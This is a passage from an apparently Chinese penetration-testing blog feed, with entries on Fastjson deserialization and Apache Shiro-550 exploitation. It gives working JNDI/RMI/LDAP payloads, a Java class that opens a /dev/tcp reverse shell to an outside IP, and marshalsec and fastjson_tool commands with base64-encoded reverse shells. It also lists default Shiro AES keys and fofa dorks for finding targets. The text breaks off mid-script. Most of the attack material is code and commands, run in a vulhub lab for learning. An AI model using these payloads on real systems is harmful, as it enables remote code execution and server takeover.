class="hljs-type">json</span><br></code></pre></td></tr></table></figure><h3 id="得到shell"><a href="#得到shell" class="headerlink" title="得到shell"></a>得到shell</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120224246651.png" alt="image-20240120224246651"></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FastJson漏洞</title>
    <link href="/2024/01/18/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/01/18/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>  Fastjson是阿里巴巴公司开源的一款JSON解析器，它可以解析 JSON 格式的字符串，是一个 Java  库， 支持将 Java  Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 Java  Bean。可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p></blockquote><p> 总结的说fastjson就是一个alibaba写的java的解析器</p><h1 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h1><blockquote><p>Fastjson &lt;&#x3D;1.2.24  反序列化远程命令执行漏洞<br>Fastjson &lt;&#x3D;1.2.41  反序列化远程命令执行漏洞<br>Fastjson &lt;&#x3D;1.2.42  反序列化远程命令执行漏洞<br>Fastjson &lt;&#x3D;1.2.43  反序列化远程命令执行漏洞<br>Fastjson &lt;&#x3D;1.2.45  反序列化远程命令执行漏洞<br>Fastjson &lt;&#x3D;1.2.47  反序列化远程命令执行漏洞<br>Fastjson &lt;&#x3D;1.2.62  反序列化远程命令执行漏洞<br>Fastjson &lt;&#x3D;1.2.66  反序列化远程命令执行漏洞  </p></blockquote><p>可见基本都是反序列化漏洞</p><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><h2 id="json认识"><a href="#json认识" class="headerlink" title="json认识"></a>json认识</h2><p>  <a href="https://www.runoob.com/json/json-tutorial.html">https://www.runoob.com/json/json-tutorial.html</a>  </p><p>总结的说，就是一种结构格式化规定</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;sites&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;菜鸟教程&quot;</span> <span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;www.runoob.com&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <br>    <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;google&quot;</span> <span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;www.google.com&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <br>    <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;微博&quot;</span> <span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;www.weibo.com&quot;</span> <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>  Fastjson的作用是用于对JSON格式的数据进行解析和打包，所以出现Json格式的地方，就有可能  使用了Fastjson  </p><h1 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h1><ol><li><p>前提知识</p><blockquote><p> java.net.InetAddress 这个类在实例化时会尝试对 example.com 进行域名解析，这时候可  以通过 dnslog 的方式得知漏洞是否存在  </p></blockquote></li><li><p>dns域名解析网站</p><blockquote><p><a href="http://dnslog.cn/">http://dnslog.cn/</a>  </p><p><a href="https://www.callback.red/">https://www.callback.red/</a></p></blockquote></li><li><p>这里我拿1.2.47举列子</p><p>获取一个域名</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118093736167.png" alt="image-20240118093736167"></p><p>然后添加payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetAddress&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;任意字符.qydzoe.dnslog.cn&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118093956030.png" alt="image-20240118093956030"></p><p>注意必须要修改content-type修改为json</p><p>然后发送这个包，我们尝试获取则这个包的结果是什么</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118102337745.png" alt="image-20240118102337745"></p></li></ol><h1 id="JNDI注入-RMI"><a href="#JNDI注入-RMI" class="headerlink" title="JNDI注入 +  RMI"></a>JNDI注入 +  RMI</h1><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>  JNDI（The Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API，命名服务将名称和对象联系起来,使得我们可以用名称访问对象。</p><p>可以访问以下的服务</p><blockquote><p>  RMI (JAVA远程方法调用)  LDAP (轻量级目录访问协议)  CORBA (公共对象请求代理体系结构)  DNS (域名服务)  </p></blockquote><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a><strong>RMI</strong></h2><p>  RMI是Java远程方法调用，是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。  </p><p>我们使用上面两个获取rce</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p><a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a>  </p><p>借助 <a href="https://github.com/mbechler/marshalsec">marshalsec</a><a href="https://github.com/mbechler/marshalsec"> </a>项目启动一个rmi服务器，监听一个端口，并指定加载远程类 Exploit.class。  </p><p><strong>maven打包项目成jar包：</strong>  </p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">mvn clean <span class="hljs-keyword">package</span> <span class="hljs-title">-DskipTests</span><br></code></pre></td></tr></table></figure><p>注意这里要求必须使用jdk1.8</p><p><strong>编写并编译恶意代码</strong></p><p>注意：</p><blockquote><p>  ava保存的文件名必须与类名一致；<br>如果文件中只有一个类，文件名必须与类名一致；<br>一个Java文件中只能有一个public类；  </p></blockquote><p>touch.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// javac Touch.java</span><br><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Touch</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Touch</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;/bin/touch /tmp/AU9U5T&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        <span class="hljs-type">Touch</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Touch</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后将这个编译成为javac程序，然后尝试去访问开启http服务，再使用maven开一个服务器</p><p>分别的指令是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server<br><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://120.27.61.239:8000/#Touch&quot;</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>记得修改ip，端口</p><p>然后发送exp</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://192.168.79.1:9999/Touch&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>记得修改为自己的ip和端口</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118105243413.png" alt="image-20240118105243413"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118105344336.png" alt="image-20240118105344336"></p><p>有收到connection<br>确定一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118105538518.png" alt="image-20240118105538518"></p><p>成功创建，尝试反弹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//javac Exploit.java</span><br><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.79.1/16789 0&gt;&amp;1&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        <span class="hljs-type">Exploit</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>先javac一下，创建一个maven服务器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">java -<span class="hljs-built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://192.168.79.1:16789/#Exploit&quot;</span> 9999<br></code></pre></td></tr></table></figure><p>发送exp</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://192.168.79.1:9999/Exploit&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118110315655.png" alt="image-20240118110315655"></p><p>成功反弹</p><h1 id="JNDI注入-LDAP"><a href="#JNDI注入-LDAP" class="headerlink" title="JNDI注入 +  LDAP"></a>JNDI注入 +  LDAP</h1><p>LDAP是基于X.500标准的轻量级目录访问协议，目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。  </p><p>我使用工具进行了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp fastjson_tool.jar fastjson.HLDAPServer <span class="hljs-number">124.71.45.28</span> <span class="hljs-number">9999</span> <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuNzEuNDUuMjgvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>记得修改反弹shell的命令</p><p>然后他会生成payload</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;e&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="hljs-string">&quot;f&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://124.71.45.28:9999/Object&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:true&#125;&#125;<br></code></pre></td></tr></table></figure><h1 id="FastJson1-2-47反序列化漏洞"><a href="#FastJson1-2-47反序列化漏洞" class="headerlink" title="FastJson1.2.47反序列化漏洞"></a>FastJson1.2.47反序列化漏洞</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>  fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的  set&#x2F;get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。 fastjson 于 1.2.24 版本后增加了反序列化白名单，而在 1.2.48 以前的版本中，攻击者可以利用特殊构造的 json 字符串绕过白名单检测，成功执行任意命令。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>  Fastjson &lt;  1.2.48  </p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">version:</span> <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-symbol">services:</span><br><span class="hljs-symbol"> web:</span><br><span class="hljs-symbol">   image:</span> vulhub/fastjson:<span class="hljs-number">1.2</span><span class="hljs-number">.45</span><br><span class="hljs-symbol">   ports:</span><br>    - <span class="hljs-string">&quot;8090:8090&quot;</span><br></code></pre></td></tr></table></figure><h2 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>  原理：java.net.InetAddress 这个类在实例化时会尝试对 example.com 进行域名解析，这时候可  以通过dnslog的方式得知漏洞是否存在 </p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>方法一和上面一样，尝试方法二</p><h3 id="JNDI注入-RMI-方法二"><a href="#JNDI注入-RMI-方法二" class="headerlink" title="JNDI注入 +  RMI   方法二"></a>JNDI注入 +  RMI   方法二</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118111344547.png" alt="image-20240118111344547"></p><p>我尝试使用第一个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118111606248.png" alt="image-20240118111606248"></p><p>就是和上面的一样，远程代码执行</p><p>直接反弹shell了</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-cp .\<span class="hljs-keyword">jndi_tool.jar </span><span class="hljs-keyword">jndi.HRMIServer </span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">79</span>.<span class="hljs-number">1</span> <span class="hljs-number">9999</span> <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzOC8yMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>注意得写自己的ip和端口</p><p>他会提醒你payload，我们直接发送他给的就行了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118112823636.png" alt="image-20240118112823636"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118112831303.png" alt="image-20240118112831303"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118112847079.png" alt="image-20240118112847079"></p><p>成功反弹</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro漏洞</title>
    <link href="/2024/01/18/%E6%B8%97%E9%80%8F/Shiro%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/01/18/%E6%B8%97%E9%80%8F/Shiro%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Apache Shiro是一种功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。  </p><p>Shiro提供了应用程序安全性API来执行以下方面：</p><ul><li><p>身份验证：证明用户身份，通常称为用户”登录”</p></li><li><p>授权：访问控制</p></li><li><p>密码术：保护或隐藏数据以防窥视</p></li><li><p>会话管理：每个用户的时间敏感状态</p><p>上述四个方面也被称为应用程序安全性的四个基石。</p></li></ul><p>关于这个漏洞，本来这个漏洞很安全的，但是出现了加密密钥不修改的情况，也就是我们可以使用默认密钥进行破解，然后反序列化</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118140826755.png" alt="image-20240118140826755"></p><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><h2 id="组件识别"><a href="#组件识别" class="headerlink" title="组件识别"></a>组件识别</h2><p>在访问及登录时抓包，如果响应头set-cookie中显示rememberMe&#x3D;deleteMe，说明使用了Shiro组件</p><h2 id="Shiro漏洞搜索"><a href="#Shiro漏洞搜索" class="headerlink" title="Shiro漏洞搜索"></a>Shiro漏洞搜索</h2><p>  通过fofa、zoomeye、shodan这类平台搜索相关特征来发现目标。  </p><blockquote><p> header&#x3D;”rememberme&#x3D;deleteMe”  </p><p>header&#x3D;”shiroCookie”  </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118130116605.png" alt="image-20240118130116605"></p><h2 id="shiro-漏洞检测"><a href="#shiro-漏洞检测" class="headerlink" title="shiro 漏洞检测"></a>shiro 漏洞检测</h2><blockquote><p><a href="https://github.com/fupinglee/ShiroScan">https://github.com/fupinglee/ShiroScan</a></p><p><a href="https://github.com/sv3nbeast/ShiroScan">https://github.com/sv3nbeast/ShiroScan</a>  </p><p><a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a>  </p><p><a href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a>  </p></blockquote><h1 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro-550"></a>Shiro-550</h1><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><blockquote><p>Apache Shiro 框架提供了记住密码的功能（RememberMe），关闭浏览器再次访问时无需再登录即  可访问。用户登录成功后用户信息会经过加密编码后存储在cookie中。在 Cookie 读取过程中有用  AES 对 Cookie 值解密的过程，对于 AES 这类对称加密算法，一旦秘钥泄露加密便形同虚设。若秘  钥可控，同时 Cookie 值是由攻击者构造的恶意 Payload，就可以将流程走通，触发危险的 Java 反  序列化，从而导致远程命令执行漏洞。  </p><p>shiro 默认使用了 CookieRememberMeManager，其处理cookie的流程是：  获取 rememberMe的cookie值–&gt;Base64解码–&gt;AES解密 –&gt;反序列化 。  </p><p>但是AES加密的密钥Key被硬编码(密钥初始就被定义好不能动态改变的)在代码里，这就意味着每个人  通过源代码都能拿到AES加密的密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、  AES加密、base64编码后，作为 cookie 的 rememberMe 字段发送。Shiro将rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118141011492.png" alt="image-20240118141011492"></p><blockquote><p>  只要<strong>rememberMe</strong>的<strong>AES</strong>加密密钥泄露，无论<strong>shiro</strong>是什么版本都可能会导致该漏洞的产生。硬编码是  将数据直接嵌入到程序或其他可执行对象的源代码中。如果在返回包的 <strong>Set-Cookie</strong> 中存在  <strong>rememberMe&#x3D;deleteMe</strong> 字段，那么就可能存在此漏洞。  </p></blockquote><p>  常见key：  </p><blockquote><p>kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D; (1.2.4默认key)<br>2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;<br>4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;<br>Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;<br>6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D;<br>ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;<br>1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D;</p></blockquote><p>payload产生的过程</p><blockquote><p>命令 &#x3D;&#x3D;&gt; 序列化 &#x3D;&#x3D;&gt; AES加密 &#x3D;&#x3D;&gt;  base64  &#x3D;&#x3D;&gt; rememberMe cookie(这个可以用于探测时候是使用的是shior)</p></blockquote><p>我们只需要蒋key获取到，然后使用工具重新生成恶意cookie，然后交给shior，他会将这个序列化，然后就相当于执行我们的恶意代码。如果我们的恶意代码是反弹shell 的话，就会反弹shell</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Apache</span> Shiro &lt;= <span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span>（需要获取AES秘钥）<br></code></pre></td></tr></table></figure><h2 id="利用组件"><a href="#利用组件" class="headerlink" title="利用组件"></a>利用组件</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span> 中的 <span class="hljs-built_in">commons-collections4</span>(理论上commons-collections2也有)<br></code></pre></td></tr></table></figure><h2 id="Payload构造-用于创建rememberMe"><a href="#Payload构造-用于创建rememberMe" class="headerlink" title="Payload构造(用于创建rememberMe)"></a>Payload构造(用于创建rememberMe)</h2><p>  ysoserial.jar 文件和脚本处于同一目录 ;  </p><blockquote><p>  <strong>python3</strong> shiro-exp.<strong>py</strong> 124.71.45.28:9998  </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 